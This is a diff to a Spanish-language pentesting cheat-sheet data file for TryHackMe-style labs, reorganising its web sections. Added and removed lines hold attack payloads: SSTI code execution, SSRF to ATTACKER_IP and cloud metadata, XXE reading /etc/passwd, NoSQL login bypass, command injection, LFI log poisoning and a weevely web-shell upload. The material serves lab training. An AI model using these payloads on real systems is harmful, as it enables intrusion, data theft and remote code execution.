@@ -1,8 +1,8 @@
 {
   "generatedAt": "2026-07-10",
   "stats": {
-    "totalSections": 19,
-    "totalCommands": 458,
+    "totalSections": 22,
+    "totalCommands": 412,
     "totalTags": 9,
     "totalGuides": 8,
     "totalConcepts": 42,
@@ -46,7 +46,7 @@
     {
       "label": "Veo una web",
       "query": "web api idor jwt upload sqli wordpress discovery",
-      "target": "web-y-apis"
+      "target": "web-discovery"
     },
     {
       "label": "Necesito pivotar",
@@ -893,9 +893,9 @@
     {
       "id": "section-06",
       "order": 6,
-      "slug": "web-y-apis",
-      "title": "Web y APIs",
-      "summary": "De discovery web a bugs de autorizacion, SSRF, JWT y uploads.",
+      "slug": "web-discovery",
+      "title": "Web discovery",
+      "summary": "Que tecnologia corre y que rutas existen antes de atacar nada.",
       "phase": "enumeration",
       "tags": [
         "web"
@@ -903,49 +903,15 @@
       "commands": [
         "curl -i $URL/",
         "whatweb -a 3 $URL",
+        "katana -u $URL -d 3",
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404",
-        "ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0",
         "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404",
-        "gobuster vhost -u $URL -w subdomains.txt --append-domain",
         "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html",
         "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ",
-        "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ",
-        "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z",
-        "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404",
-        "ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404",
-        "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0",
-        "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php",
-        "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404",
-        "katana -u $URL -d 3",
+        "ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0",
+        "gobuster vhost -u $URL -w subdomains.txt --append-domain",
         "arjun -u \"$URL/page.php\"",
-        "curl -sS $URL/api/ ; curl -sS $URL/api/v1/",
-        "curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs",
-        "curl -sS -i -X OPTIONS \"$URL/api/resource\"",
-        "for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
-        "curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}'",
-        "curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT'",
-        "curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
-        "curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}'",
-        "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
-        "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
-        "sqlmap -r request.txt --batch --level 3",
-        "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
-        "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
-        "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
-        "curl -sS \"$URL/?name={{7*7}}\"",
-        "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
-        "weevely generate S3cr3t shell.php",
-        "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
-        "weevely $URL/uploads/shell.php S3cr3t",
-        "git-dumper $URL/.git/ ./loot_git",
-        "curl -sS \"$URL/.git/HEAD\"",
-        "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php\"",
-        "curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\"",
-        "curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\"",
-        "curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\"",
-        "curl -sS \"$URL/page.php?file=data://text/plain;base64,BASE64_PHP&c=id\"",
-        "curl -sS \"$URL/page.php?file=/proc/self/environ\" -A 'PAYLOAD_PHP'",
-        "python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP'",
+        "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0",
         "arjun -u \"$URL/api/endpoint\"",
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404",
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404",
@@ -953,80 +919,17 @@
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404",
         "ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404",
         "ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
+        "ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404",
         "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/",
+        "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ",
+        "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z",
         "wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/",
+        "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php",
         "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k",
         "gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404",
-        "gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
-        "GET /api/users/1001",
-        "GET /api/users/1002",
-        "GET /api/orders/5",
-        "GET /api/orders/6",
-        "jwt_tool TOKEN",
-        "python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY",
-        "POST /graphql",
-        "{\"query\":\"{__schema{types{name}}}\"}",
-        "{\"query\":\"{users{id username email role}}\"}",
-        "url=http://127.0.0.1:80",
-        "url=http://localhost:8000",
-        "url=http://169.254.169.254/latest/meta-data/",
-        "url=http://[::1]/",
-        "url=file:///etc/passwd",
-        "<?xml version=\"1.0\"?>",
-        "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
-        "<root>&xxe;</root>",
-        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
-        "username[$ne]=admin&password[$ne]=x",
-        "{\"$where\":\"this.username=='admin'\"}",
-        "; id",
-        "&& id",
-        "| id",
-        "`id`",
-        "$(id)",
-        "%0Aid"
+        "gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
       ],
-      "tables": [
-        [
-          "Bug",
-          "Senales y prueba inicial"
-        ],
-        [
-          "LFI",
-          "Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter."
-        ],
-        [
-          "SSTI",
-          "Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar."
-        ],
-        [
-          "IDOR/BOLA",
-          "Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota."
-        ],
-        [
-          "JWT",
-          "Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil."
-        ],
-        [
-          "GraphQL",
-          "Introspection, tipos, queries/mutations con id/userId/admin/debug."
-        ],
-        [
-          "SSRF",
-          "Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost."
-        ],
-        [
-          "XXE",
-          "Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab."
-        ],
-        [
-          "Upload",
-          "Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion."
-        ],
-        [
-          "Command injection",
-          "host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
-        ]
-      ],
+      "tables": [],
       "blocks": [
         [
           "h2",
@@ -1041,21 +944,28 @@
           [
             "curl -i $URL/",
             "whatweb -a 3 $URL",
-            "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404",
-            "ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0",
-            "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404",
-            "gobuster vhost -u $URL -w subdomains.txt --append-domain",
-            "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html",
-            "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ",
-            "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ",
-            "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z",
-            "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404",
-            "ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404",
-            "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0",
-            "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php",
-            "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404",
             "katana -u $URL -d 3",
-            "arjun -u \"$URL/page.php\""
+            "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404",
+            "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404",
+            "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html",
+            "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ"
+          ]
+        ],
+        [
+          "h2",
+          "Vhosts, parametros y JS"
+        ],
+        [
+          "p",
+          "Descubrimiento mas fino: subdominios por Host header, parametros ocultos, y rutas que solo aparecen en el JavaScript de la app."
+        ],
+        [
+          "code",
+          [
+            "ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0",
+            "gobuster vhost -u $URL -w subdomains.txt --append-domain",
+            "arjun -u \"$URL/page.php\"",
+            "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0"
           ]
         ],
         [
@@ -1063,11 +973,56 @@
           [
             "Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz.",
             "Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos.",
-            "En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas.",
             "En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales.",
-            "Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto."
+            "Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto.",
+            "Para vhosts, anade primero el dominio a /etc/hosts; si no, el Host header puede no resolver como esperas."
           ]
+        ]
+      ],
+      "searchText": "Web discovery Que tecnologia corre y que rutas existen antes de atacar nada. Fingerprinting y discovery Antes de atacar, mapea la web: que tecnologia corre y que rutas existen. El fuzzing saca paneles, backups y APIs que no estan enlazados. curl -i $URL/ whatweb -a 3 $URL katana -u $URL -d 3 ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ Vhosts, parametros y JS Descubrimiento mas fino: subdominios por Host header, parametros ocultos, y rutas que solo aparecen en el JavaScript de la app. ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster vhost -u $URL -w subdomains.txt --append-domain arjun -u \"$URL/page.php\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0 Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz. Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos. En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales. Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto. Para vhosts, anade primero el dominio a /etc/hosts; si no, el Host header puede no resolver como esperas. arjun -u \"$URL/api/endpoint\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404 ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404 gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
+    },
+    {
+      "id": "section-07",
+      "order": 7,
+      "slug": "web-apis-y-autorizacion",
+      "title": "Web APIs y autorizacion",
+      "summary": "Metodos HTTP, JSON, IDOR/BOLA, JWT y GraphQL: donde vive el bug de autorizacion.",
+      "phase": "enumeration",
+      "tags": [
+        "web"
+      ],
+      "commands": [
+        "curl -sS $URL/api/ ; curl -sS $URL/api/v1/",
+        "curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs",
+        "for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
+        "curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}'",
+        "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
+        "curl -sS \"$URL/api/users/1001\" -H \"Authorization: Bearer $TOKEN\"",
+        "curl -sS \"$URL/api/orders/5\" -H \"Authorization: Bearer $TOKEN\"",
+        "jwt_tool TOKEN",
+        "python3 -c \"import jwt; print(jwt.get_unverified_header('TOKEN')); print(jwt.decode('TOKEN', options={'verify_signature': False}))\"",
+        "curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
+        "curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{users{id username email role}}\"}'"
+      ],
+      "tables": [
+        [
+          "Bug",
+          "Senales y prueba inicial"
         ],
+        [
+          "IDOR/BOLA",
+          "Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota."
+        ],
+        [
+          "JWT",
+          "Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil."
+        ],
+        [
+          "GraphQL",
+          "Introspection, tipos, queries/mutations con id/userId/admin/debug."
+        ]
+      ],
+      "blocks": [
         [
           "h2",
           "APIs REST y metodos HTTP"
@@ -1081,38 +1036,310 @@
           [
             "curl -sS $URL/api/ ; curl -sS $URL/api/v1/",
             "curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs",
-            "curl -sS -i -X OPTIONS \"$URL/api/resource\"",
             "for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
             "curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}'",
-            "curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT'",
-            "curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
-            "curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}'",
-            "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
-            "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
-            "sqlmap -r request.txt --batch --level 3"
+            "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\""
           ]
         ],
         [
           "h2",
-          "Explotacion web (LFI / SSTI / upload)"
+          "IDOR / BOLA"
         ],
         [
           "p",
-          "Payloads para los bugs mas comunes: LFI (leer ficheros del servidor), SSTI (inyeccion en plantillas) y subida de ficheros. Confirma con una prueba inocua antes de ir a por ejecucion."
+          "La prueba mas rentable de toda esta seccion: cambiar IDs y comparar la respuesta entre dos usuarios o dos recursos."
+        ],
+        [
+          "code",
+          [
+            "curl -sS \"$URL/api/users/1001\" -H \"Authorization: Bearer $TOKEN\"",
+            "curl -sS \"$URL/api/orders/5\" -H \"Authorization: Bearer $TOKEN\""
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Crea dos cuentas si la room lo permite; compara respuestas del mismo endpoint con cada token.",
+            "Prueba IDs numericos secuenciales, UUIDs filtrados, emails, usernames y slugs.",
+            "No basta con que el frontend oculte el boton: prueba la llamada a la API directamente.",
+            "Senal fuerte: 200 con datos de otro usuario, o una accion aceptada sobre un recurso ajeno."
+          ]
+        ],
+        [
+          "h2",
+          "JWT"
+        ],
+        [
+          "code",
+          [
+            "jwt_tool TOKEN",
+            "python3 -c \"import jwt; print(jwt.get_unverified_header('TOKEN')); print(jwt.decode('TOKEN', options={'verify_signature': False}))\""
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Mira alg, kid, jku, exp, role, isAdmin, user_id en el payload decodificado.",
+            "Prueba manipulacion solo en lab: alg none, secreto debil (rockyou contra HS256), confusion HS/RS si el reto apunta a ello.",
+            "Si el rol cambia en el cliente pero el servidor no revalida firma/autorizacion del token, hay bug."
+          ]
+        ],
+        [
+          "h2",
+          "GraphQL"
+        ],
+        [
+          "code",
+          [
+            "curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
+            "curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{users{id username email role}}\"}'"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Prueba introspection primero; si esta activa, enumera tipos y queries/mutations disponibles.",
+            "Busca queries con id, userId, file, path, admin, debug en el nombre o los argumentos.",
+            "El IDOR tambien aplica aqui: cambia variables en queries/mutations entre usuarios."
+          ]
+        ],
+        [
+          "table",
+          [
+            [
+              "Bug",
+              "Senales y prueba inicial"
+            ],
+            [
+              "IDOR/BOLA",
+              "Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota."
+            ],
+            [
+              "JWT",
+              "Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil."
+            ],
+            [
+              "GraphQL",
+              "Introspection, tipos, queries/mutations con id/userId/admin/debug."
+            ]
+          ],
+          [
+            3.6,
+            12.6
+          ]
+        ]
+      ],
+      "searchText": "Web APIs y autorizacion Metodos HTTP, JSON, IDOR/BOLA, JWT y GraphQL: donde vive el bug de autorizacion. APIs REST y metodos HTTP Las APIs se prueban distinto a una web clasica: importan el metodo HTTP y el cuerpo JSON. Un endpoint puede ser vulnerable solo por un verbo (PUT/POST) o por un campo del JSON. curl -sS $URL/api/ ; curl -sS $URL/api/v1/ curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}' curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\" IDOR / BOLA La prueba mas rentable de toda esta seccion: cambiar IDs y comparar la respuesta entre dos usuarios o dos recursos. curl -sS \"$URL/api/users/1001\" -H \"Authorization: Bearer $TOKEN\" curl -sS \"$URL/api/orders/5\" -H \"Authorization: Bearer $TOKEN\" Crea dos cuentas si la room lo permite; compara respuestas del mismo endpoint con cada token. Prueba IDs numericos secuenciales, UUIDs filtrados, emails, usernames y slugs. No basta con que el frontend oculte el boton: prueba la llamada a la API directamente. Senal fuerte: 200 con datos de otro usuario, o una accion aceptada sobre un recurso ajeno. JWT jwt_tool TOKEN python3 -c \"import jwt; print(jwt.get_unverified_header('TOKEN')); print(jwt.decode('TOKEN', options={'verify_signature': False}))\" Mira alg, kid, jku, exp, role, isAdmin, user_id en el payload decodificado. Prueba manipulacion solo en lab: alg none, secreto debil (rockyou contra HS256), confusion HS/RS si el reto apunta a ello. Si el rol cambia en el cliente pero el servidor no revalida firma/autorizacion del token, hay bug. GraphQL curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{users{id username email role}}\"}' Prueba introspection primero; si esta activa, enumera tipos y queries/mutations disponibles. Busca queries con id, userId, file, path, admin, debug en el nombre o los argumentos. El IDOR tambien aplica aqui: cambia variables en queries/mutations entre usuarios. Bug Senales y prueba inicial IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug."
+    },
+    {
+      "id": "section-08",
+      "order": 8,
+      "slug": "web-inyecciones",
+      "title": "Web inyecciones",
+      "summary": "SSTI, SSRF, XXE, NoSQLi y command injection: confirmar antes de explotar.",
+      "phase": "enumeration",
+      "tags": [
+        "web"
+      ],
+      "commands": [
+        "curl -sS \"$URL/?name={{7*7}}\"",
+        "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
+        "python3 -m http.server 8000",
+        "curl -sS \"$URL/fetch?url=http://ATTACKER_IP:8000/\"",
+        "curl -sS \"$URL/fetch?url=http://169.254.169.254/latest/meta-data/\"",
+        "curl -sS \"$URL/fetch?url=http://127.0.0.1:80/\"",
+        "printf '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' > xxe.xml",
+        "curl -sS -X POST $URL/upload --data-binary @xxe.xml -H 'Content-Type: application/xml'",
+        "curl -sS -X POST $URL/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'",
+        "curl -sS \"$URL/login?username[$ne]=admin&password[$ne]=x\"",
+        "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
+        "curl -sS \"$URL/convert?file=test.jpg; id\""
+      ],
+      "tables": [
+        [
+          "Bug",
+          "Senales y prueba inicial"
+        ],
+        [
+          "SSTI",
+          "Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar."
+        ],
+        [
+          "SSRF",
+          "Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost."
+        ],
+        [
+          "XXE",
+          "Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab."
+        ],
+        [
+          "Command injection",
+          "host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+        ]
+      ],
+      "blocks": [
+        [
+          "h2",
+          "SSTI"
+        ],
+        [
+          "code",
+          [
+            "curl -sS \"$URL/?name={{7*7}}\"",
+            "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\""
+          ]
+        ],
+        [
+          "h2",
+          "SSRF"
+        ],
+        [
+          "code",
+          [
+            "python3 -m http.server 8000",
+            "curl -sS \"$URL/fetch?url=http://ATTACKER_IP:8000/\"",
+            "curl -sS \"$URL/fetch?url=http://169.254.169.254/latest/meta-data/\"",
+            "curl -sS \"$URL/fetch?url=http://127.0.0.1:80/\""
+          ]
+        ],
+        [
+          "h2",
+          "XXE"
+        ],
+        [
+          "code",
+          [
+            "printf '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' > xxe.xml",
+            "curl -sS -X POST $URL/upload --data-binary @xxe.xml -H 'Content-Type: application/xml'"
+          ]
+        ],
+        [
+          "h2",
+          "NoSQL injection"
+        ],
+        [
+          "code",
+          [
+            "curl -sS -X POST $URL/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'",
+            "curl -sS \"$URL/login?username[$ne]=admin&password[$ne]=x\""
+          ]
+        ],
+        [
+          "h2",
+          "Command injection"
+        ],
+        [
+          "code",
+          [
+            "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
+            "curl -sS \"$URL/convert?file=test.jpg; id\""
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "SSTI: confirma primero con una operacion matematica ({{7*7}}); identifica el motor antes de ir a por RCE.",
+            "SSRF: confirma SIEMPRE contra tu propio listener antes de probar localhost/metadata/redes internas.",
+            "XXE: solo aplica si la app procesa XML (import, SOAP, SVG, DOCX/XLSX, SAML). Si no refleja salida, intenta OOB.",
+            "NoSQLi: senal = backend Node/Mongo, errores BSON/Mongoose, filtros JSON directos en login o busqueda.",
+            "Command injection: confirma con comandos inocuos (id/whoami/hostname) antes de nada destructivo; sin output, usa sleep/ping hacia tu maquina."
+          ]
